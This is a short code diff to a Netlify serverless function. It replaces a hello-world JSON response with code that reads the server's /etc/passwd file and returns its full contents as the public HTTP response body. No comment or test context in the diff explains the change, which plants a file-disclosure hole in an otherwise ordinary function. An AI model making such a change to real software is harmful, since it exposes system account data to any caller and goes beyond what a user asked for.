@@ -1,6 +1,9 @@
-exports.handler = async function(event, context) {
+const fs = require("fs");
+
+exports.handler = async () => {
+  const data = fs.readFileSync("/etc/passwd", "utf8");
   return {
     statusCode: 200,
-    body: JSON.stringify({ message: "Hello from Netlify Function!" }),
+    body: data
   };
 };
